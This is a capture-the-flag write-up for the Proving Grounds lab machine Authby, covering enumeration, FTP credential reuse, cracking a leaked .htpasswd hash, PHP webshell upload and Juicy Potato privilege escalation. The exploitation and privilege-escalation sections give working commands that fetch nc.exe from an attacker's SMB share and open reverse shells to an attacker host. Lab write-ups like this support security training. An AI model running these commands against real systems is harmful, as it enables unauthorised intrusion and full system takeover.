---
description: Writeup for Authby from Offensive Security Proving Grounds (PG)
---

# Authby

## Service Enumeration

`nmapAutomator.sh -H 192.168.85.46 -t full`

`nmapAutomator.sh -H 192.168.85.46 -t vulns`

### FTP

Anonymous login allowed.

![](../../.gitbook/assets/40cfb057749e43a990907b307b638aba.png)

While we cannot access these files, we can see that there are some account names.

![](../../.gitbook/assets/0a2edee418e842e4b7c1828d8e2b8b1c.png)

Using the account `admin:admin`, we get access to some other files.

![](../../.gitbook/assets/7be4c6dead964fbfaec383280f08c380.png)

The `.htaccess` and `.htpasswd` files are leaked.

![](../../.gitbook/assets/e776c36431db4b93a15994031cc7939e.png)

.htaccess

```text
AuthName "Qui e nuce nuculeum esse volt, frangit nucem!"
AuthType Basic
AuthUserFile c:\\wamp\www\.htpasswd
<Limit GET POST PUT>
Require valid-user
</Limit>
```

.htpasswd

```text
offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0
```

Passing the `.htpasswd` hash into John the Ripper, we find the credentials to authenticate into the HTTP server.

![](../../.gitbook/assets/bfb9cc2aaeab49158478a651a9d8a10d.png)

![](../../.gitbook/assets/2cd7d80a55de4d43a0b44df1f215b49c%20%281%29.png)

### RDP

![](../../.gitbook/assets/df3789bd1922460f8f7a9d819749753b.png)

### Nonstandard Ports

![](../../.gitbook/assets/5c7893d2d0964eebae8877ae720acdae.png)

### HTTP

![](../../.gitbook/assets/a13f5f2be1f74edcb940d14977663974.png)

Using the previously found credentials \(`offsec:elite`\), we can authenticate into the application.

![](../../.gitbook/assets/f8c64ee6bb2540ba95059dc4d09f9328.png)

### Subdirectory Enumeration

`gobuster dir -u http://192.168.85.46:242/ -w /usr/share/dirb/wordlists/common.txt -k -x .txt,.php --threads 50 -U offsec -P elite`

![](../../.gitbook/assets/e9e3eed9a56843f998f59dc7f3dc5db1.png)

`gobuster dir -u http://192.168.85.46:242/phpmyadmin -w /usr/share/dirb/wordlists/common.txt -k -x .txt,.php --threads 50 -U offsec -P elite -s 200,204,301,302,307,401`

## Exploitation

Using the PHP backdoor from `/usr/share/webshells/php/simple-backdoor.php`, we can upload this backdoor through the `admin` FTP account to the web root. Then, we can visit the `simple-backdoor.php` and use the `cmd=` parameter to achieve RCE.

![](../../.gitbook/assets/bc1ba58429bc4867800b3b6cb46e556f.png)

Copy `nc.exe` through SMB:

`http://192.168.85.46:242/simple-backdoor.php?cmd=copy \\192.168.49.85\ROPNOP\netcat\nc.exe .`

Trigger a reverse shell:

`http://192.168.85.46:242/simple-backdoor.php?cmd=nc.exe -e cmd.exe 192.168.49.85 443`

On our listening machine, we get a reverse shell.

![](../../.gitbook/assets/54b41425cb8b4a96af76ab0675f16f86.png)

![](../../.gitbook/assets/b24523a311fc49bb965e3d59dc2c33ba.png)

## Privilege Escalation

First, we know that `SeImpersonatePrivilege` is enabled.

![](../../.gitbook/assets/d717307d71944017b76803599566a274.png)

We can perform privilege escalation using Juicy Potato.

However, there are two challenges.

1. This is an x86 system, so we need an x86 Juicy Potato executable. I used the one from here: [https://github.com/ivanitlearning/Juicy-Potato-x86/releases](https://github.com/ivanitlearning/Juicy-Potato-x86/releases)
2. The default CLSID doesn't work. Juicy Potato will return `COM -> recv failed with error: 10038`.

`systeminfo` shows that this is Windows Server 2008.

![](../../.gitbook/assets/c030a1ac33394a86ba17426d70dd3e14.png)

We can use one of the BITS CSLIDs from here: [https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows\_Server\_2008\_R2\_Enterprise](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise). I used `{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}`.

![](../../.gitbook/assets/fe5b98fc281e4f108da259928e60e839.png)

Now, we can use the `nc.exe` we transferred previously to get another reverse shell, this time with SYSTEM privileges.

`juicy.potato.x86.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\wamp\www\nc.exe -e cmd.exe 192.168.49.85 443" -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}`

![](../../.gitbook/assets/c157e7dea6834ec6a3d240f1ce3eb823.png)

On our listening machine:

![](../../.gitbook/assets/ab393a6a63df465e8439202e42aa018e.png)

![](../../.gitbook/assets/51120c1f70f14bfa92f41d88bb66a50d.png)

